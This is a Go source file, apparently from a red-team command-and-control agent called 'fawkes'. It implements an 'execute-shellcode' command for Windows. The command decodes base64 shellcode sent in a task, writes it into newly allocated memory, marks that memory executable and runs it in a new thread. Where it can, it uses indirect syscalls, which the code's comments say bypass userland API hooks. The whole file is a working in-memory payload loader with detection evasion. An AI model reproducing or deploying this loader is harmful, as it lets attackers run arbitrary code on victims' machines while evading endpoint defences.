//go:build windows

package commands

import (
	"encoding/base64"
	"encoding/json"
	"fmt"
	"syscall"
	"unsafe"

	"fawkes/pkg/structs"
)

// ExecuteShellcodeCommand executes shellcode in the current process.
type ExecuteShellcodeCommand struct{}

func (c *ExecuteShellcodeCommand) Name() string {
	return "execute-shellcode"
}

func (c *ExecuteShellcodeCommand) Description() string {
	return "Execute shellcode in the current process via VirtualAlloc + CreateThread"
}

type executeShellcodeArgs struct {
	ShellcodeB64 string `json:"shellcode_b64"`
}

var (
	procCreateThread     = kernel32.NewProc("CreateThread")
	procWaitSingleObject = kernel32.NewProc("WaitForSingleObject")
	procVirtualAllocSC   = kernel32.NewProc("VirtualAlloc")
	procVirtualProtectSC = kernel32.NewProc("VirtualProtect")
)

func (c *ExecuteShellcodeCommand) Execute(task structs.Task) structs.CommandResult {
	var args executeShellcodeArgs
	if task.Params == "" {
		return structs.CommandResult{
			Output:    "Error: shellcode_b64 parameter required",
			Status:    "error",
			Completed: true,
		}
	}
	if err := json.Unmarshal([]byte(task.Params), &args); err != nil {
		return structs.CommandResult{
			Output:    fmt.Sprintf("Error parsing parameters: %v", err),
			Status:    "error",
			Completed: true,
		}
	}
	if args.ShellcodeB64 == "" {
		return structs.CommandResult{
			Output:    "Error: shellcode_b64 is empty",
			Status:    "error",
			Completed: true,
		}
	}

	shellcode, err := base64.StdEncoding.DecodeString(args.ShellcodeB64)
	if err != nil {
		return structs.CommandResult{
			Output:    fmt.Sprintf("Error decoding shellcode: %v", err),
			Status:    "error",
			Completed: true,
		}
	}

	if len(shellcode) == 0 {
		return structs.CommandResult{
			Output:    "Error: shellcode is empty after decoding",
			Status:    "error",
			Completed: true,
		}
	}

	// Use indirect syscalls if available (bypasses userland API hooks)
	if IndirectSyscallsAvailable() {
		return c.executeIndirect(shellcode)
	}
	return c.executeStandard(shellcode)
}

func (c *ExecuteShellcodeCommand) executeStandard(shellcode []byte) structs.CommandResult {
	// Allocate RW memory in current process
	addr, _, lastErr := procVirtualAllocSC.Call(
		0,
		uintptr(len(shellcode)),
		MEM_COMMIT|MEM_RESERVE,
		PAGE_READWRITE,
	)
	if addr == 0 {
		return structs.CommandResult{
			Output:    fmt.Sprintf("Error: VirtualAlloc failed: %v", lastErr),
			Status:    "error",
			Completed: true,
		}
	}

	// Copy shellcode to allocated memory
	//nolint:gosec // intentional shellcode execution for red team tool
	copy(unsafe.Slice((*byte)(unsafe.Pointer(addr)), len(shellcode)), shellcode)

	// Change to RX (no write)
	var oldProtect uint32
	ret, _, lastErr := procVirtualProtectSC.Call(
		addr,
		uintptr(len(shellcode)),
		PAGE_EXECUTE_READ,
		uintptr(unsafe.Pointer(&oldProtect)),
	)
	if ret == 0 {
		return structs.CommandResult{
			Output:    fmt.Sprintf("Error: VirtualProtect failed: %v", lastErr),
			Status:    "error",
			Completed: true,
		}
	}

	// Create thread to execute shellcode
	hThread, _, lastErr := procCreateThread.Call(
		0,    // security attributes
		0,    // stack size (default)
		addr, // start address
		0,    // parameter
		0,    // creation flags (run immediately)
		0,    // thread ID
	)
	if hThread == 0 {
		return structs.CommandResult{
			Output:    fmt.Sprintf("Error: CreateThread failed: %v", lastErr),
			Status:    "error",
			Completed: true,
		}
	}

	syscall.CloseHandle(syscall.Handle(hThread))

	return structs.CommandResult{
		Output:    fmt.Sprintf("Shellcode executed successfully\n  Size: %d bytes\n  Address: 0x%X\n  Method: Standard Win32 API\n  Thread created and running", len(shellcode), addr),
		Status:    "success",
		Completed: true,
	}
}

func (c *ExecuteShellcodeCommand) executeIndirect(shellcode []byte) structs.CommandResult {
	currentProcess := ^uintptr(0) // -1 = current process pseudohandle

	// Step 1: Allocate RW memory via NtAllocateVirtualMemory
	regionSize := uintptr(len(shellcode))
	var addr uintptr
	status := IndirectNtAllocateVirtualMemory(currentProcess, &addr, &regionSize,
		MEM_COMMIT|MEM_RESERVE, PAGE_READWRITE)
	if status != 0 {
		return structs.CommandResult{
			Output:    fmt.Sprintf("Error: NtAllocateVirtualMemory failed: NTSTATUS 0x%X", status),
			Status:    "error",
			Completed: true,
		}
	}

	// Step 2: Copy shellcode (in-process, no API needed)
	//nolint:gosec // intentional shellcode execution for red team tool
	copy(unsafe.Slice((*byte)(unsafe.Pointer(addr)), len(shellcode)), shellcode)

	// Step 3: Change to RX via NtProtectVirtualMemory
	protectAddr := addr
	protectSize := uintptr(len(shellcode))
	var oldProtect uint32
	status = IndirectNtProtectVirtualMemory(currentProcess, &protectAddr, &protectSize,
		PAGE_EXECUTE_READ, &oldProtect)
	if status != 0 {
		return structs.CommandResult{
			Output:    fmt.Sprintf("Error: NtProtectVirtualMemory failed: NTSTATUS 0x%X", status),
			Status:    "error",
			Completed: true,
		}
	}

	// Step 4: Create thread via NtCreateThreadEx
	var hThread uintptr
	status = IndirectNtCreateThreadEx(&hThread, currentProcess, addr)
	if status != 0 {
		return structs.CommandResult{
			Output:    fmt.Sprintf("Error: NtCreateThreadEx failed: NTSTATUS 0x%X", status),
			Status:    "error",
			Completed: true,
		}
	}

	syscall.CloseHandle(syscall.Handle(hThread))

	return structs.CommandResult{
		Output:    fmt.Sprintf("Shellcode executed successfully\n  Size: %d bytes\n  Address: 0x%X\n  Method: Indirect syscalls (calls from ntdll)\n  Thread created and running", len(shellcode), addr),
		Status:    "success",
		Completed: true,
	}
}
